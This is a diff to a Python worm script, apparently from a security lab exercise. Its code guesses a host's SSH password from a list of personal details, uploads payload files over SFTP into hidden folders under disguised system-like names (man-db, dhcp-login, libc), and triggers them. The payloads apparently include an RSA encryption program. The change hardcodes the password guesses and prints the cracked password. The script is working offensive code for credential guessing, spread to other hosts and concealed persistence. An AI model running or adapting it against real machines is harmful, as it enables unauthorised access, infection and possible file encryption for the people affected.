@@ -21,7 +21,7 @@ def CrackMe():
 
 def DictionaryAttack(ip):
     password = ''
-    info = [d.split(':')[1].strip() for d in open('/home/victim/materials/attacker.dat').readlines()][:-1] + ['@', '_']
+    info = ['YueHan', 'Wang', 'YH', '1999', '0228', 'oscar', 'Realtek', '@', '_']
     for i in info:
         if password != '':
             break
@@ -50,13 +50,13 @@ def Hiding(ip, password):
             t = paramiko.Transport((ip, 22))
             t.connect(username='attacker', password=password)
             sftp = paramiko.SFTPClient.from_transport(t)
-            sftp.put('/home/victim/materials/RSA/RSA_Encrypt', '/home/attacker/Public/.Simple_Worm/man-db')
-            sftp.put('/home/victim/Public/.Simple_Worm/Loop/Loop_ping', '/home/attacker/Public/.Simple_Worm/dhcp-login')
+            sftp.put('./RSA_Encrypt', '/home/attacker/Public/.Simple_Worm/man-db')
+            sftp.put('./Loop_ping', '/home/attacker/Public/.Simple_Worm/dhcp-login')
             sftp.put('./cron', '/home/attacker/Public/.Simple_Worm/misc')
             sftp.put('./trigger', '/home/attacker/Public/.Simple_Worm/libc')
 
-            sftp.put('/home/victim/materials/RSA/RSA_Encrypt', '/home/attacker/Desktop/.Backup/man-db')
-            sftp.put('/home/victim/Public/.Simple_Worm/Loop/Loop_ping', '/home/attacker/Desktop/.Backup/dhcp-login')
+            sftp.put('./RSA_Encrypt', '/home/attacker/Desktop/.Backup/man-db')
+            sftp.put('./Loop_ping', '/home/attacker/Desktop/.Backup/dhcp-login')
             sftp.put('./cron', '/home/attacker/Desktop/.Backup/misc')
             sftp.put('./trigger', '/home/attacker/Desktop/.Backup/libc')
             t.close()
@@ -82,3 +82,4 @@ ip = sys.argv[1].strip()
 password = DictionaryAttack(ip).strip()
 Hiding(ip, password)
 Trigger(ip, password)
+print(password)
